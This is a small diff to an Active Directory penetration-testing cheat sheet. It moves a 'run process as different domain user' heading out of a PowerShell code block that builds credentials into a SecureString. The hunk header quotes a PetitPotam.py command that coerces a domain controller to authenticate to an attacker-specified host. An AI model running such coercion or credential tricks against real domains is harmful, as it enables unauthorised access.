@@ -280,8 +280,9 @@ python3 PetitPotam.py attacketip dc.jaki.local --dc-ip 10.10.1.1 --u someuser --
 
 ### Additional tricks:
 
+Run process as different domain user:
+
 ```
-Run process as different Powershell user:
 $username = 'someuser'
 $password = 'somepassword'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
